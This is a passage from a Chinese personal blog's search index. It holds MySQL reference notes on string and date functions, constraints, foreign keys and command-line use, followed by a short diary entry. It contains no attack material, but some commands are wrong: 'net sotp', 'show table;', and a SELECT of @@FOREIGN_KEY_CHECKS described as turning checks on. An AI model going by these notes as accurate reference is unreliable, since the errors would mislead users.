class="line">concat_WS(&#39;sep&#39;,s1,s2,s3,……,sn);</span><br><span class="line"># 去除字符串首部和尾部的所有空格</span><br><span class="line">TRIM(str)</span><br><span class="line"># 去除leading里面的字符。</span><br><span class="line">TRIM(leading &#39;x&#39;,str)</span><br><span class="line"># 返回字符串 str ，顺序和字符顺序相反。</span><br><span class="line">REVERSE(str) </span><br><span class="line"># 返回字符串 str ，结尾空格字符被删去。</span><br><span class="line">RTRIM(str) </span><br><span class="line"># 从字符串str中切掉开头的空格</span><br><span class="line">LTRIM(str)</span><br><span class="line"></span><br><span class="line"># 判断是否相等 相等返回1 不等返回0</span><br><span class="line">select strcmp (s1,s2) </span><br><span class="line"></span><br><span class="line"># 保留小数</span><br><span class="line">select format(字段，格式化保留位数) from 表名 where [条件表达式];</span><br><span class="line"></span><br><span class="line"># 返回字段长度  返回中文长度</span><br><span class="line">select char_length(str);</span><br><span class="line"></span><br><span class="line"># 返回右边</span><br><span class="line">select right (str,len);</span><br><span class="line"></span><br><span class="line"># 替换</span><br><span class="line">select insert (原字符串,起始字符,替换字符)</span><br><span class="line"></span><br><span class="line"># 字符串从左边截取</span><br><span class="line">select left(str,len);</span><br><span class="line"># 返回长度 返回中文字符长度  1个字符&#x3D; 3个字节</span><br><span class="line">select length(set)</span><br><span class="line"></span><br><span class="line"># 截取长度 字符串 起始位置 截取长度</span><br><span class="line">select mid(str,pos,len)</span><br><span class="line"></span><br><span class="line"># 截取长度</span><br><span class="line">select substring() 比较常用</span><br><span class="line"></span><br><span class="line"># 替换 字符串 被替换 替换</span><br><span class="line">select replace(str,from_str,to_str)</span><br><span class="line"></span><br><span class="line"># 全局</span><br><span class="line">global </span><br><span class="line"></span><br><span class="line"># 转义字符\在mysql当中同样可取 三种方法</span><br><span class="line">&quot;McDonald&#39;s&quot;</span><br><span class="line">&#39;McDonald\&#39;s&#39;</span><br><span class="line">&#39;McDonald&#39;&#39;s&#39;</span><br><span class="line"></span><br><span class="line"># group_concat 将指定字段值拼凑成一字符串，每个数值之间使用逗号分隔</span><br><span class="line">group_concat(字段[str]);</span><br></pre></td></tr></table></figure><p>日期函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询星期几 由于索引是星期天开始，所以之后的需要加1</span><br><span class="line">select Dayofweek(&#39;2019-09-12&#39;);</span><br><span class="line"></span><br><span class="line"># 显示日期里面的值，后面的字符串表示 年月日时分秒都可</span><br><span class="line"># 大小写的值是不一样的</span><br><span class="line">date_format(date,format)</span><br><span class="line">select elDate,date_format(eldate,&#39;%y %m %d %h:%i:%s&#39;) from elogs</span><br><span class="line"></span><br><span class="line"># 返回过去的几天</span><br><span class="line">select DATE_SUB(Now(),INTERVAL 7 DAY);</span><br><span class="line"></span><br><span class="line"># 返回两个指定日期的时间和日期的边界天数</span><br><span class="line">select DATEDIFF(&#39;2019-09-12&#39;,&#39;2019-08-25&#39;);</span><br><span class="line"># 返回值：18</span><br></pre></td></tr></table></figure><h4 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.域完整性:---------匹配完整性：非空、缺省</span><br><span class="line">字段&#x2F;列</span><br><span class="line"></span><br><span class="line">2.实体完整性:-------匹配完整性：主键、唯一键</span><br><span class="line">记录&#x2F;行</span><br><span class="line"></span><br><span class="line">3.引用完整性:-------匹配完整性：外键</span><br><span class="line">表与表之间</span><br></pre></td></tr></table></figure><h4 id="约束-constraint"><a href="#约束-constraint" class="headerlink" title="约束:constraint"></a>约束:constraint</h4><p>MySQL中的约束分类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  主键:primary key</span><br><span class="line">  唯一键:unique</span><br><span class="line">  非空:not null</span><br><span class="line">  缺省:default</span><br><span class="line">  外键:foreign key</span><br><span class="line"></span><br><span class="line">主键、唯一键、外键都会自动创建索引</span><br><span class="line">主键:一个表只能有一个主键，其可以对应一个字段，也可以对应多个字段(组合主键)</span><br><span class="line">唯一键:也成为候选主键(跟主键的区别在于可以存储null值)</span><br><span class="line">外键:来源于主表的主键或唯一键(可允许为空，且其值必须在主表中出现过)</span><br></pre></td></tr></table></figure><p>创建约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">constraint 约束名 约束类型(字段名) references 主表(主键字段或唯一键字段)</span><br></pre></td></tr></table></figure><p>创建外键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">constraint 约束名 foreign key(对应字段) references 主表(主键字段或唯一键字段)</span><br></pre></td></tr></table></figure><p>创建组合主键</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">primary key (字段1,字段2)</span><br></pre></td></tr></table></figure><p>对于已经存在的表，创建唯一键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 add constraint 约束名 unique(字段名);</span><br></pre></td></tr></table></figure><p>删除约束的数据 先删除子表数据，再删除主表数据</p><p>级联删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">on delete cascade </span><br></pre></td></tr></table></figure><p>级联更新</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">on update cascade</span><br></pre></td></tr></table></figure><p>关掉mysql外键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET FOREIGN_KEY_CHECKS&#x3D;0;</span><br></pre></td></tr></table></figure><p>打开mysql外键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT  @@FOREIGN_KEY_CHECKS;</span><br></pre></td></tr></table></figure><p>删除外键<br>注意：此语句在删除外键后不能关联删除该外键自动产生的约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop foreign key 外键名称;</span><br></pre></td></tr></table></figure><p>删除唯一键<br>注意：唯一键删除后对应的索引也会自动删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop index 唯一键字段名;</span><br></pre></td></tr></table></figure><p>删除指定名称的索引</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop index 索引名称;</span><br></pre></td></tr></table></figure><p>提醒：对于有主外关联的表，删除表中数据，如果无删除的级联操作，那么删除主表数据之前，必须先删除从表对应数据</p><h4 id="在命令行中使用mysql"><a href="#在命令行中使用mysql" class="headerlink" title="在命令行中使用mysql"></a>在命令行中使用mysql</h4><p>启动mysql服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure><p>停止mysql服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net sotp mysql </span><br></pre></td></tr></table></figure><p>通过命令行进入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u 用户名 -p </span><br><span class="line">键入后会提示输入密码</span><br><span class="line">如果不能进入数据库就使用绝对路径或者配置环境变量</span><br></pre></td></tr></table></figure><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p>查看表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show table;</span><br></pre></td></tr></table></figure><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>数据库的应用多种多样，后面想到的都会写下来。</p>]]></content>
      
      
      <categories>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不定时日记</title>
      <link href="2020/09/15/hello-world/"/>
      <url>2020/09/15/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="2020-10-07"><a href="#2020-10-07" class="headerlink" title="2020-10-07"></a>2020-10-07</h3><p>恍恍惚惚，这江湖的人不就是来来去去走走停停的吗？</p><h3 id="2020-09-23"><a href="#2020-09-23" class="headerlink" title="2020-09-23"></a>2020-09-23</h3><p>不知不觉接触安全已经一年了，从今天开始新的一天继续冲！</p><h3 id="2020-09-15"><a href="#2020-09-15" class="headerlink" title="2020-09-15"></a>2020-09-15</h3><p>搭建博客只为记录知识与生活。</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
